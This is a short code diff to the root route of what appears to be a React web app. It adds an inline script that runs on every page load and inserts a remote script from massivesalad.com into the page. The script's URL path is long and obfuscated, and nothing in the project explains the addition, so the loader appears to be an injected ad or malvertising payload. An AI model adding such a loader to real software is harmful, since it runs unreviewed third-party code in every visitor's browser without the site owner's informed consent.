@@ -115,6 +115,9 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
         async: true,
         crossOrigin: "anonymous",
       },
+      {
+        children: `(function(vfrg){var d=document,s=d.createElement('script'),l=d.scripts[d.scripts.length-1];s.settings=vfrg||{};s.src="//massivesalad.com/bgX.V/sUdGGxlX0/YUWmcL/seKm-9CuNZkU/lBkLPBTocsylN/ztgF3VMKDmUGtsNNzbIJ3WOVD_cJwjOWQv";s.async=true;s.referrerPolicy='no-referrer-when-downgrade';l.parentNode.insertBefore(s,l);})({})`,
+      },
       { children: themeInitScript() },
     ],
   }),
